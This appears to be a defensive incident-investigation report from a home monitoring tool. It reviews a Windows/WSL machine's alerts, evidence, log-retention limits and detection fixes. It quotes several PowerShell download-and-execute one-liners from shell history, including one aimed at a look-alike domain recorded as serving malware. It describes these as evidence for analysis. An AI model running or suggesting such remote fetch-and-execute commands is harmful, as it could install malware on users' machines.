# JARVIS alert investigation — 9 September 2026

The machine cannot be declared clean. The raw-device email overstates defective
telemetry, and the temporary JavaScript file is probably an application artifact.
The emailed PowerShell command remains unexplained. A further material finding is an item the
previous detector missed entirely: PowerShell history contains a command targeting
a documented malware-serving look-alike domain.

The surrounding activation-script invocations suggest troubleshooting, but their
results are not recorded. A malicious loader could have succeeded without
activating Windows, prompting further attempts. The retained Windows logs do not
reach back far enough to settle execution. The finding remains CRITICAL pending
further assessment; a clean scan alone would not prove no historical compromise.

## Findings

| Evidence | Assessment | Handling |
| --- | --- | --- |
| `tee opened c` | The HIGH disk-imaging conclusion is unsupported; likely telemetry false positive | Reclassified unresolved device events as MEDIUM, retained evidence |
| `iex ((New-Object Net.WebClient).DownloadString('https://get.activated.win'))` | Genuine download-and-execute command in history, unrecognized by the user; success unknown | Retained HIGH |
| `irm https://get.activate.win \| iex` | Additional, more serious history entry referencing a documented malware-download host | New distinct CRITICAL finding; no claim that infection is proved |
| `cc9c3fe9-50a0-4302-90ab-6f2f13b5914a.tmp.js` | Likely an older Codex desktop worker; unsigned status alone does not prove malware | Preserved file and existing alert; no broad script or application exemption |
| Claude policy-path EIO | Stale Windows-drive mount in the affected shell | **Resolved** by a WSL restart; policy file confirmed absent, which is correct for an unmanaged install |

## Raw-device evidence

The journal window at `2026-09-08T15:12:25Z` contains 13 Event 9 records for
ProcessGuid `{be5aebaf-fd80-6a9c-a1f7-8c7f14580000}`, PID 698, `/usr/bin/tee`.
Five report `Device=c`; eight report `Device=-`. All carry payload `UtcTime`
`2026-09-06 05:43:28.468`. Journal ingestion time and payload time disagree;
neither the reminder email nor its send time proves a new operation occurred.

The matching ProcessCreate event reports:

```text
tee -a /home/chris/.local/state/wsl-keepalive/wsl-keepalive.log
```

Its executable SHA-256 matches the current `/usr/bin/tee`:
`743845c7f838dfb667f5557ae4f7144fe1ca329b94bd8fc2b23029a705f67e51`.
The named log is currently a regular file. This supports a routine log append;
it does not establish what every historical file descriptor referenced.

The installed Sysmon package is 1.5.2. Its upstream `processFileOpen` implementation
emits RawAccessRead for block-device opens, without establishing a completed read,
read/write direction, or imaging. GNU `tee` copies standard input to outputs.
[Sysmon 1.5.2 source](https://github.com/microsoft/SysmonForLinux/blob/1.5.2/sysmonforlinux.c),
[GNU tee documentation](https://www.gnu.org/software/coreutils/manual/html_node/tee-invocation.html).

The correction keeps absolute device paths HIGH, including paths opened by `tee`.
Missing or relative targets remain MEDIUM uncertainty. Matching process GUIDs
supply command context; PID equality alone is insufficient. Legacy unresolved
HIGH rows are reclassified without resetting their age or erasing alert history.

## PowerShell evidence and detection gap

The 350-line history file contains the look-alike command at line 315, followed by
several attempts using the actual activation project's domains, including an HTTP
attempt. The originally emailed WebClient command is at line 325. The user states
they do not recognize that command. No authorization is inferred from the domain's
popularity or from neighboring commands.

The surrounding sequence (lines 315-325) contains repeated activation attempts
and a proxy query. Their timing, operator, and individual results are unknown:

```text
315 irm https://get.activate.win | iex      <- missing 'd' (the malware look-alike)
316 irm https://get.activated.win | iex     <- immediately corrected
317 irm https://massgrave.dev/get | iex
318 netsh winhttp show proxy                <- connectivity troubleshooting
319 irm https://get.activated.win | iex
320 irm http://get.activated.win | iex      <- retried over plain HTTP
321 irm https://get.activated.win | iex
322 irm https://github.com/massgravel/...   <- fetch only, no execution
324 irm https://get.activated.win | iex
325 iex ((New-Object Net.WebClient).DownloadString('https://get.activated.win'))
```

The changed spelling on the next line is consistent with correcting a typo, and
the proxy query is consistent with connectivity troubleshooting. Neither excludes
a successful download from the first hostname. PSReadLine records command text
only. It carries no exit status, no per-command timestamp, and no indication of
what any of these requests returned, so a single successful fetch on line 315
cannot be excluded from history alone. The finding stays CRITICAL on that basis.

`get.activated.win` is documented by the Microsoft Activation Scripts project.
`get.activate.win`, missing the final **d** in `activated`, has a URLhaus
malware-download record dated 23 December 2025. Its current offline status does
not establish what it served when this history entry was created.
[Project repository](https://github.com/massgravel/Microsoft-Activation-Scripts),
[URLhaus evidence](https://urlhaus.abuse.ch/url/3740911/).

The old regex recognized `iwr` and WebClient patterns but omitted `irm` and
`Invoke-RestMethod`. The fix covers those forms, evaluates all collected lines
instead of stopping after 15 matches, and gives the exact malware hostname its own
CRITICAL title so the generic history alert cannot overwrite it in deduplication.
Hostname matching uses URL authority, not a substring in a path or username.

PSReadLine persists command text; it does not supply per-command timestamps or
proof that a fetched payload completed execution. History can also be modified.
[Microsoft PSReadLine documentation](https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline).

## Temporary JavaScript file

Read as data only; never executed, removed, uploaded, or allowlisted.

* Size: 1,855,232 bytes.
* SHA-256: `49d373744dde772aa5efe59f681c7ab46bb9065d8ac2c35982c2240dacc60a9c`, matching the email.
* Modification time: `2026-09-02T00:48:42.426376Z`.
* Contents identify a Node worker using `worker_threads`, Codex desktop RPC/git
  operations, OpenTelemetry/Sentry/Datadog instrumentation, and a `worker.js.map`
  source-map reference. No activation-domain marker was found.
* Local Codex worker logs at `2026-09-02T00:48:42.683Z` reference
  `OpenAI.Codex_26.820.9563.0` and its `app.asar/.vite/build/worker.js`.
* The currently installed package is `26.901.6511.0`; its worker is 1,914,844 bytes,
  SHA-256 `aa7c3436e123a479bd5eb805380f331609078ef3afb6127159b5b7bdf0dd05c9`.
  Its hash agrees with its archive integrity metadata, but differs from the old
  temporary file. No matching old installed archive was established.

The content and timing strongly support an old Codex worker, but are not an
independent byte-for-byte provenance verification. Electron documents temporary
extraction for certain archive-backed filesystem APIs; this makes temporary
application files plausible, not automatically safe.
[Electron archive behavior](https://github.com/electron/electron/blob/main/docs/tutorial/asar-archives.md),
[Microsoft Authenticode signature inspection](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-authenticodesignature).

## Windows log review and limits

Private copies were parsed locally with python-evtx 0.8.1. Copies came from live
logs and are not a VSS snapshot. The parser reported no record errors.

| Log | Records | Retained UTC window |
| --- | ---: | --- |
| Defender Operational | 4,927 | 1 April–9 September 2026 |
| Windows PowerShell | 2,252 | 8 September 15:21 – 9 September 13:50 |
| PowerShell Operational | 606 | 9 September, 13:46:46–13:50:13 |
| Windows Sysmon Operational | 23,947 | 5 September 16:48 – 9 September 13:49 |

Counts are from the re-collected copies. The PowerShell Operational log retains
under four minutes and the two Sysmon/PowerShell logs only a few days, so none of
them reach back to when the activation commands were entered — the original alert
for that history line was first mailed on 3 September. The absence of a match is
therefore a retention limit, not exculpatory evidence.

Literal searches of retained event-record data found no activation-domain,
Cosmali, or exact temporary-filename matches. Defender records were parsed in
full; five detection records name the old uTorrent bundle installer. These
results neither prove a successful malicious download nor rule one out. The
alert ledger already contains the original history warning from 3 September,
before the retained execution logs above. The normal JARVIS audit also reports
that Defender exclusions cannot be read without Windows elevation.

No new full/offline antivirus scan was completed. Given the unrecognized
malware-domain command, an elevated Defender assessment, exclusion review, and
full/offline scan remain warranted. An offline scan reboots Windows and should
be scheduled after saving work. If payload execution is corroborated, incident
response should include containment and session/credential revocation from a
trusted device; repeated clean process snapshots alone are insufficient.

Private raw evidence, parser output, and a SHA-256 manifest are in
`/home/chris/.jarvis/evidence/2026-09-09-activation-lookalike` and
`/home/chris/.jarvis/evidence/2026-09-09-activation-lookalike-snapshot1`
(directory mode 0700).

The first collection was written under `/tmp` and was destroyed by the WSL restart
described below before it could be used. It has been re-collected to the path above,
which survives a restart. The re-collected `.tmp.js` still hashes to
`49d3737...acc60a9c`, matching the original alert, so that artefact is unchanged.
The re-collected event logs cover later retention windows than the first copy and
again contain no activation-domain match; see the table above for the current
windows. Retain this directory if pursuing formal incident response.

## Claude EIO repair - resolved

**Status: resolved.** A WSL restart (`wsl --shutdown` and relaunch) replaced the
stale DrvFS connection. `/mnt/c` now reads normally in a new shell, and
`C:\Program Files\ClaudeCode\managed-settings.json` returns
`No such file or directory` rather than `EIO`. Claude Code starts without the
managed-policy error.

The absent policy file is the correct state, not a second fault: managed settings
exist only on an installation placed under organization management, and this one is
not. Nothing was created, deleted, or weakened to fix this.
[Claude settings documentation](https://code.claude.com/docs/en/settings).

`repair-windows-mount.sh` is retained for a recurrence that does not warrant a full
WSL restart. It overlays a fresh DrvFS connection only when the Windows executable
path is unreadable, then verifies drive access and any existing policy JSON. It does
not create, delete, or change policies, stop WSL, or force-unmount files in use.
Mounting needs the user's sudo password; only the JARVIS service restart is
passwordless on this host. It is syntax-checked but has not been exercised against a
live EIO mount, because the restart resolved the condition first.

Reading Windows event logs as an unprivileged user still requires the mount
namespace of a process whose `/mnt/c` was established without the restrictive
uid/gid mapping; a direct read of `winevt\Logs` from the current shell returns
`Permission denied`.

## Validation

162 tests passed, including regressions for real device paths, unresolved devices,
PID reuse, persisted-alert age, the actual missing-d hostname, `irm`, and long-form
`Invoke-RestMethod`. Bash syntax and `git diff --check` passed. JARVIS was restarted
with its configured passwordless service command; the affected live collectors
were queued to verify persistence and runtime behavior.
